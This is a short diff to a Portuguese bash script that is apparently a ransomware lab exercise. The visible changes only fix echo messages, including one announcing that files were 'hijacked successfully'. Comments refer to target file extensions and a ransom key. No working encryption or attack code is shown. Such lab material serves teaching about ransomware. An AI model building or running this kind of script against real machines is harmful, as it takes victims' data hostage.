@@ -6,7 +6,7 @@
 #################################
 
 echo "----------------------------------------------"
-echo "Iniciando script...
+echo "Iniciando script...			    "
 echo "----------------------------------------------"
 
 # local e extenções de arquivos que serão atacadas neste lab:
@@ -32,7 +32,7 @@ do
 done
 
 echo "----------------------------------------------"
-echo "$1 arquivos sequestrados com sucesso!
+echo "$i arquivos sequestrados com sucesso!         "
 echo "----------------------------------------------"
 
 # vamos gerar um nova chave para proteger minha chave privada necessária para resgate
